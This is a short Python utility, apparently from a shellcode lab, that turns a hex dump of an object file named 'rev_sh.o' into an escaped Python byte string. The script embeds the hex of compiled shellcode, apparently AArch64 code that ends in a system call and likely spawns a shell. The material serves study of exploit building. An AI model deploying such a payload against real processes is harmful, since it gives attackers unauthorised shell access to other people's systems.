#!/usr/bin/env python3
  
# Run "xxd -p -c 20 rev_sh.o",
# copy and paste the machine code to the following:
ori_sh ="""
0b0501100c0484d273010ccb2901094a
280180d2696a2838880180d2696a2838e80980d2
696a2838080a80d2e90313aa696a28f8080b80d2
490180d2e90309cb690209cb696a28f8080c80d2
090280d2e90309cb690209cb696a28f8080d80d2
290109ca696a28f8e00313aa614201b1940214ca
e20314aaa81b80d2e16602d4
"""

sh = ori_sh.replace("\n", "")

length  = int(len(sh)/2)
print("Length of the shellcode: {}".format(length))
s = 'shellcode= (\n' + '   "'
for i in range(length):
    s += "\\x" + sh[2*i] + sh[2*i+1]
    if i > 0 and i % 16 == 15:
       s += '"\n' + '   "'
s += '"\n' + ").encode('latin-1')"
print(s)

